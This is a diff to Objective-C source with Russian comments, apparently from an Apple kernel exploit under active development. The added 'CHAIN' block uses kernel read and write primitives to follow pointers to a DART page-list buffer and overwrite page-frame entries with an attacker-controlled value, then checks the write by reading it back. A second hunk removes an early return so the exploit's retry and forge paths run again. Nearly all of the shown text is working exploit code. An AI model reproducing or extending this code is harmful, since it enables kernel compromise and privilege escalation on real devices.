@@ -6298,12 +6298,49 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // паника назовёт адрес (x1), остальное не тронуто.
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
+    // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
+    // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
+    // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
+    // +0x30=entries {pfn32,flags32} stride 8. Cached map-путь ЧИТАЕТ эти записи
+    // (сериализатор 0x86eab60 → mapper → DART leaf PTE): патч entry[0].lo32=ctlPFN
+    // (hi32=4 сохраняем — флаг mapped), submit с bit43=0 (уже в tsdV) перестраивает
+    // PTE из отравленного буфера. Маркеры на каждом шаге = самопроверка.
+    if (pfn32 && ctlPFN) {
+        uint64_t pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t vt247 = pd247 ? kp_untag_ptr(early_kread64(pd247)) : 0;
+        uint64_t typ247 = pd247 ? (early_kread64(pd247 + 0x20) & 0xf0) : 0;
+        uint64_t hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
+        uint64_t buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
+        uint32_t cnt247 = buf247 ? (uint32_t)early_kread64(buf247 + 0x28) : 0;
+        uint8_t bfl247 = 0; if (buf247) kreadbuf(buf247 + 0x2d, &bfl247, 1);
+        kpNote(r, [NSString stringWithFormat:@"  [CHAIN] pd=%#llx vt=%#llx type=%#llx hdr=%#llx buf=%#llx count=%#x flags=%#x — %@",
+                  (unsigned long long)pd247, (unsigned long long)vt247, (unsigned long long)typ247,
+                  (unsigned long long)hdr247, (unsigned long long)buf247, cnt247, bfl247,
+                  (buf247 && cnt247 && cnt247 < 0x1000) ? @"маркеры сошлись, патчим entries" : @"маркеры МИМО — fallback на EARLY-скан"]);
+        if (buf247 && cnt247 && cnt247 < 0x1000) {
+            for (uint32_t i = 0; i < cnt247 && nDep < 24; i++) {
+                uint64_t e = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
+                if ((uint32_t)e != pfn32) continue;
+                if (!((uint32_t)(e >> 32) == 0 || (uint32_t)(e >> 32) == 4)) continue;
+                int zc = kpZoneClass(buf247 + 0x30 + (uint64_t)i * 8);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ entry[%u] @ %#llx: %#018llx → ctlPFN %#x (зона: %@)",
+                          i, (unsigned long long)(buf247 + 0x30 + (uint64_t)i * 8), (unsigned long long)e, ctlPFN,
+                          zc == 1 ? @"PER-CPU (restore обязателен)" : zc == 0 ? @"обычная" : @"не зона/VM"]);
+                usleep(1500);
+                early_kwrite64(buf247 + 0x30 + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | ctlPFN);
+                uint64_t rb = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
+            }
+        }
+    }
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
     // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
     // (physmap-записей ноль — урок 220/242), классификатор зоны р.59 в лог,
     // запись с сохранением hi32 (форма5). Retry-цикл ниже подхватывает их как
     // обычные DEP-хиты; restore — сразу после вердикта, до любого teardown'а.
-    if (pfn32 && ctlPFN && nSA) {
+    // 1.9.247: fallback — только если CHAIN ничего не зарегистрировал.
+    if (pfn32 && ctlPFN && nSA && !nDep) {
         for (int i = 0; i < nSA && nDep < 24; i++) {
             uint64_t q = saQ[i];
             if (!((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4))) continue;
@@ -7255,9 +7292,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
         kpNote(r, [NSString stringWithFormat:@"  измерение: попаданий=%d (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)", nHits]);
-        IOObjectRelease(svc);
-        free(ctl);
-        return r;
+        // 1.9.247: ранний return УБРАН — при rangesVA=0 (этот билд) он превращал
+        // retry/spec/forge в мёртвый код (прогон 246 умер на «попаданий=2»).
+        // Ниже 7266 обрабатывает rangesVA=0 штатно — падаем в retry-конвейер.
     }
 
     // 4. подмена pfn: порт-маршрут (1.9.143) уже пропатчил слоты ДО submit;
